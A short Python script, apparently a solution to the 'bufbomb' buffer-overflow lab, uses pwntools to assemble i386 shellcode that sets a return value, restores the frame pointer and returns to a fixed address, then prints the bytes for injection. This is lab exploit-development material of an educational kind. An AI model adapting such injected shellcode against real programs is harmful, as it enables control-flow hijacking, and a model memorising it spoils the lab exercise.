from pwn import *
# p=process(argv=['./bufbomb', '-u','22'])
# p.interactive()
context.arch = 'i386'
code=asm('''
    mov eax , 0x2b65becd
    mov ebp , 0x55683850
    push 0x8048dbe
    ret
    ''')
for i in range(0,len(code)):
    print(hex(code[i]))